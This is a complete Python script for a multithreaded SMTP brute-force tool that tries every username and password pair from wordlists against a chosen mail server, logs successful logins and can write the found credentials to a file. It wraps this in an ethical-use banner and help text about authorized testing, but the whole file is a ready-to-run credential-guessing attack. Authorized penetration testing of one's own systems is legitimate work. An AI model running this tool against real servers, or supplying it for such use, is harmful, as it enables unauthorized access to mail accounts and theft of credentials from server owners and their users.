#!/usr/bin/env python3
import smtplib
import socket
import time
import argparse
import sys
from threading import Thread, Lock
from queue import Queue

class SMTPBruteForce:
    def __init__(self, target, port=25, timeout=10, threads=5, delay=1):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.threads = threads
        self.delay = delay
        self.found_credentials = []
        self.lock = Lock()
        self.queue = Queue()
        self.stop_flag = False
        
    def test_connection(self):
        """Test if the target SMTP server is accessible"""
        try:
            with socket.create_connection((self.target, self.port), timeout=self.timeout):
                return True
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"[!] Connection error: {e}")
            return False
    
    def try_login(self, username, password):
        """Attempt to login with given credentials"""
        try:
            with smtplib.SMTP(self.target, self.port, timeout=self.timeout) as server:
                server.ehlo_or_helo_if_needed()
                server.login(username, password)
                return True
        except smtplib.SMTPAuthenticationError:
            return False
        except smtplib.SMTPException as e:
            print(f"[!] SMTP error with {username}:{password} - {e}")
            return False
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"[!] Connection error: {e}")
            return False
    
    def worker(self):
        """Worker thread for processing credentials"""
        while not self.stop_flag and not self.queue.empty():
            try:
                username, password = self.queue.get_nowait()
            except:
                break
                
            if self.try_login(username, password):
                with self.lock:
                    self.found_credentials.append((username, password))
                    print(f"[+] SUCCESS! {username}:{password}")
            else:
                print(f"[-] Failed: {username}:{password}")
            
            # Respect delay to avoid account lockout
            time.sleep(self.delay)
            self.queue.task_done()
    
    def start(self, usernames, passwords):
        """Start the brute force process"""
        if not self.test_connection():
            print("[!] Cannot connect to the target SMTP server")
            return False
            
        print(f"[*] Starting SMTP brute force on {self.target}:{self.port}")
        print(f"[*] Using {self.threads} threads with {self.delay}s delay between attempts")
        
        # Populate the queue with username/password combinations
        for username in usernames:
            for password in passwords:
                self.queue.put((username, password))
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for queue to be processed
        self.queue.join()
        
        # Stop workers
        self.stop_flag = True
        for t in threads:
            t.join(timeout=1)
            
        return True

def load_wordlist(file_path):
    """Load a wordlist from file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File '{file_path}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error loading wordlist: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="SMTP Brute Force Scanner - For Ethical Security Testing Only",
        epilog="Warning: Use only with explicit permission on systems you own or are authorized to test."
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target SMTP server address")
    parser.add_argument("-p", "--port", type=int, default=25, help="SMTP port (default: 25)")
    parser.add_argument("-U", "--usernames", required=True, help="File containing usernames")
    parser.add_argument("-P", "--passwords", required=True, help="File containing passwords")
    parser.add_argument("-o", "--output", help="File to save successful credentials")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--delay", type=float, default=1, help="Delay between attempts in seconds (default: 1)")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    # Print warning message
    print("""
    =======================================================
    | ETHICAL USE WARNING                                  |
    | This tool is for educational and security testing    |
    | purposes only. Only use it on systems you own or     |
    | have explicit written permission to test.            |
    | Unauthorized access is illegal and punishable by law.|
    =======================================================
    """)
    
    # Load wordlists
    usernames = load_wordlist(args.usernames)
    passwords = load_wordlist(args.passwords)
    
    print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
    
    # Initialize and start the scanner
    scanner = SMTPBruteForce(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        threads=args.threads,
        delay=args.delay
    )
    
    start_time = time.time()
    scanner.start(usernames, passwords)
    elapsed = time.time() - start_time
    
    # Print results
    print("\n[*] Scan completed in {:.2f} seconds".format(elapsed))
    
    if scanner.found_credentials:
        print("[+] Found valid credentials:")
        for username, password in scanner.found_credentials:
            print(f"    {username}:{password}")
            
        # Save to file if requested
        if args.output:
            try:
                with open(args.output, 'w') as f:
                    for username, password in scanner.found_credentials:
                        f.write(f"{username}:{password}\n")
                print(f"[+] Results saved to {args.output}")
            except Exception as e:
                print(f"[!] Error saving results: {e}")
    else:
        print("[-] No valid credentials found")

if __name__ == "__main__":
    main()